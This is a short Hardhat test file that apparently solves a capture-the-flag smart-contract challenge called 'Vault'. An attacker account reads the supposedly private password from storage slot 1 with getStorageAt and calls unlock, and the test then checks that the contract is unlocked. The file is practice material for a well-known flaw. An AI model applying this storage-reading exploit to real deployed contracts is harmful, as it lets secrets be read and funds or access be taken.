import { expect } from "chai";
import { ethers } from "hardhat";

describe("Vault", () => {
  it("Solves the challenge", async () => {
    const {provider, utils} = ethers
    const [deployer, attacker] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("Vault")
    const contract = await contractFactory.connect(deployer).deploy(utils.formatBytes32String('abc'))
    await contract.deployed()

    const password = await provider.getStorageAt(contract.address, 1)

    const tx = await contract.connect(attacker).unlock(password)
    await tx.wait()
    
    expect(await contract.locked()).to.be.false
  });
});